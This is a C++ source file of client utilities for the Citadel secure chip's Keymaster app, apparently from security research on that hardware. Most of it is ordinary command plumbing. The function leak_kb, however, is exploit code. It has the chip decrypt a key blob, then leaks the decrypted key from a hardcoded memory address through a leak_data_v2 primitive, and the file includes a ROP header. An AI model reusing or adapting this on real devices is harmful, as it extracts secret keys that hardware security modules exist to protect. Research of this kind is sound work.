#include "utils.h"

/* Protobuf */
#include <google/protobuf/util/json_util.h>

/* From Nugget OS */
#include <app_nugget.h>
#include <application.h>
#include <fcntl.h>
#include <nos/NuggetClient.h>
#include <nos/device.h>
#include <nostypes.h>
#include <nosutils.h>
#include <nugget/app/avb/avb.pb.h>
#include <rop.h>
#include <stdio.h>
#include <unistd.h>

#include <fstream>
#include <vector>

using namespace nostypes;
using nos::NuggetClient;
using namespace google::protobuf::util;

void print_vector(const std::vector<uint8_t> v) {
  for (const auto x : v) printf("%02x ", x);
  printf("\n");
}

uint32_t reset() {
  NuggetClient client(CITADEL_DEV);
  client.Open();

  const nos_device &device = *client.Device();
  device.ops.reset(device.ctx);

  client.Close();
  return 0;
}

static size_t readFully(int fd, uint8_t *data, size_t size) {
  size_t remaining = size;
  while (remaining > 0) {
    ssize_t n = read(fd, (void *)data, remaining);
    if (n <= 0) {
      return size - remaining;
    }
    data += n;
    remaining -= n;
  }
  return size;
}

// Leak decrypted keyblob
uint32_t leak_kb(::nugget::app::keymaster::KeyBlob *keyblob,
                 ::nugget::app::keymaster::KeyParameters *params,
                 int64_t keysize) {
  // First ask the chip to decrypt the key blob
  // Through BeginOperation command
  NuggetClient client(CITADEL_DEV);
  client.Open();

  if (!client.IsOpen()) {
    std::cerr << "Error opening client" << std::endl;
    exit(1);
  }

  // reset the chip
  const nos_device &device = *client.Device();
  device.ops.reset(device.ctx);

  // Make BeginOperation message
  App app_id = Keymaster;
  KeymasterCmdsId cmd_id = BeginOperation;

  nugget::app::keymaster::BeginOperationRequest *request =
      new nugget::app::keymaster::BeginOperationRequest();

  request->set_allocated_blob(keyblob);
  request->set_allocated_params(params);

  // setting request purpose, since it must be specified in the request
  // as well as in the keyparameters. Since for now we only support symmetric
  // keys, we use the encryption purpose
  request->set_purpose(nugget::app::keymaster::KeyPurpose::ENCRYPT);

  // send the command
  std::string serialized_test;
  request->SerializeToString(&serialized_test);
  std::vector<uint8_t> request_vector(serialized_test.begin(),
                                      serialized_test.end());

  std::vector<uint8_t> response_vector;
  response_vector.resize(MAX_RESPONSE_SIZE);

  // std::cout << "Request size " << request_vector.size() << std::endl;
  uint32_t ret =
      client.CallApp(app_id, cmd_id, request_vector, &response_vector);

  std::string response_str(response_vector.begin(), response_vector.end());
  nugget::app::keymaster::BeginOperationResponse *response =
      new nugget::app::keymaster::BeginOperationResponse();
  response->ParseFromString(response_str);

  initNosPrinter();
  printNosCommand("Keymaster", "BeginOperation", (Message &)*request,
                  (Message &)*response);

  delete (request);
  delete (response);

  client.Close();

  // Then leak the global memory corresponding to the decrypted keyblob
  // std::cout << "# Leak decrypted keyblob" << std::endl;
  uint32_t addr = 0x1a998 + 0xec + 0x588;
  leak_data_v2(addr, keysize, false);

  return 0;
}

uint32_t generate_dump_blob() {
  NuggetClient client(CITADEL_DEV);
  client.Open();

  if (!client.IsOpen()) {
    std::cerr << "Error opening client" << std::endl;
    exit(1);
  }

  App app_id = Keymaster;
  KeymasterCmdsId cmd_id = GenerateKey;

  nugget::app::keymaster::GenerateKeyRequest *request =
      new nugget::app::keymaster::GenerateKeyRequest();
  nugget::app::keymaster::KeyParameters *params =
      new nugget::app::keymaster::KeyParameters();

  nugget::app::keymaster::KeyParameter *keysize_param = params->add_params();
  keysize_param->set_tag(nugget::app::keymaster::KEY_SIZE);
  keysize_param->set_integer(128);

  nugget::app::keymaster::KeyParameter *algo_param = params->add_params();
  algo_param->set_tag(nugget::app::keymaster::ALGORITHM);
  algo_param->set_integer(2);

  nugget::app::keymaster::KeyParameter *mode_param = params->add_params();
  mode_param->set_tag(nugget::app::keymaster::BLOCK_MODE);
  mode_param->set_integer(1);

  nugget::app::keymaster::KeyParameter *keyuse_param = params->add_params();
  keyuse_param->set_tag(nugget::app::keymaster::PURPOSE);
  keyuse_param->set_integer(1);

  request->set_allocated_params(params);

  std::cout << "Request:" << std::endl;
  request->PrintDebugString();

  std::string serialized_test;
  request->SerializeToString(&serialized_test);
  std::vector<uint8_t> request_vector(serialized_test.begin(),
                                      serialized_test.end());

  std::vector<uint8_t> response_vector;
  response_vector.resize(MAX_RESPONSE_SIZE);

  uint32_t ret =
      client.CallApp(app_id, cmd_id, request_vector, &response_vector);

  std::string response_str(response_vector.begin(), response_vector.end());
  nugget::app::keymaster::GenerateKeyResponse *response =
      new nugget::app::keymaster::GenerateKeyResponse();
  response->ParseFromString(response_str);
  nugget::app::keymaster::KeyBlob key_blob = response->blob();

  fstream dumpkey("blob", ios::out | ios::binary);
  if (!key_blob.SerializeToOstream(&dumpkey)) {
    std::cerr << "Error dumping key blob to file";
  }

  std::cout << "Response:" << std::endl;
  response->PrintDebugString();
  std::cout << "Return code: " << ret << std::endl;

  delete (request);
  delete (response);

  client.Close();

  return 0;
}

static void printRequestDefinition(Message *msg) {
  std::cerr << "Missing arguments: " << std::endl;
  auto desc = msg->GetDescriptor();
  std::cerr << "{" << std::endl;
  for (int i = 0; i < desc->field_count(); i++) {
    auto field = desc->field(i);
    std::cerr << '\t' << field->name() << ": " << field->cpp_type_name()
              << std::endl;
  }
  std::cerr << "}" << std::endl;
}

/*
 * Send a command to a Citadel application. Takes a optional json string as
 * argument. Return the status code coming from nos library.
 */
int callNosCmd(const char *body, const NosApp *app, const NosCmd *cmd) {
  auto req = cmd->request->New();
  auto res = cmd->reply->New();
  req->CopyFrom(*cmd->request);
  res->CopyFrom(*cmd->reply);

  auto num_fields = req->GetDescriptor()->field_count();
  if ((num_fields > 0) && !body) {
    printRequestDefinition(req);
    // return 3;
  }

  if (body) {
    auto status = JsonStringToMessage(body, req);
    if (status.ok()) {
      std::cout << "Request:" << endl;
      req->PrintDebugString();
      std::cout << endl;
    } else {
      std::cerr << "Json parsing issue: " << status << std::endl;
      return 1;
    }
  }

  // init the client
  NuggetClient client(CITADEL_DEV);
  uint32_t rv;

  client.Open();

  if (!client.IsOpen()) {
    std::cerr << "Error opening client " << CITADEL_DEV << std::endl;
    return 2;
  }

  // convert request to vector<uint8_t>
  std::string sreq;
  req->SerializeToString(&sreq);
  std::vector<uint8_t> vecreq(sreq.begin(), sreq.end());

  std::vector<uint8_t> vecres;
  vecres.resize(MAX_RESPONSE_SIZE);

  // call nos lib
  rv = client.CallApp(app->id, cmd->id, vecreq, &vecres);

  // print result
  std::string response_str(vecres.begin(), vecres.end());
  res->ParseFromString(response_str);
  std::cout << "Response:" << endl;
  res->PrintDebugString();
  std::cout << "Return code: " << rv << endl;

  // close the client
  client.Close();

  return rv;
}
